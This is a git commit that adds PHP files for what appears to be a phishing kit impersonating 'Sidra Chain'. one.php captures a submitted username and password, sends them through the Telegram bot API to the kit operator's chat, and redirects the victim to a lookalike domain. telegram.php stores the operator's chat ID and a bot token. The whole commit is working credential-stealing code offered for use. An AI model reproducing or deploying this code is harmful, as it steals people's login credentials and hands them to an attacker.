317e034d9ba246c3209fdd11fb10809b162e3a35
MyKennesia <154445838+Kennesia@users.noreply.github.com>
2024-07-23 06:11:36 +0700

    Add files via upload

---
+++ buyyer5/one.php
@@ -0,0 +1,32 @@
+<?php
+
+session_start();
+include "./telegram.php";
+
+$kennesia = $_POST['kenn'];
+$_SESSION['kenn'] = $kennesia;
+$kennesiaa = $_POST['ken'];
+$_SESSION['ken'] = $kennesiaa;
+
+$message = "
+( SIDRA CHAIN | @Kennesia )
+
+- Username : ".$kennesia."
+- Password : ".$kennesiaa."
+";
+
+function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
+    $url = "https://api.telegram.org/bot" . $kennesia_token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $kennesia_telegram_id;
+    $url = $url . "&text=" . urlencode($message);
+    $ch = curl_init();
+    $optArray = array(
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
+sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
+header('Location: https://sidrachaiinnmall.app-id.site');
+?>
---
+++ buyyer5/telegram.php
@@ -0,0 +1,4 @@
+<?php
+$kennesia_telegram_id = "7041999333";
+$kennesia_token_bot = "7000670001:AAEtFUiycuR8Z5-wSj8_BduatCcE7Jg9PCg";
+?>
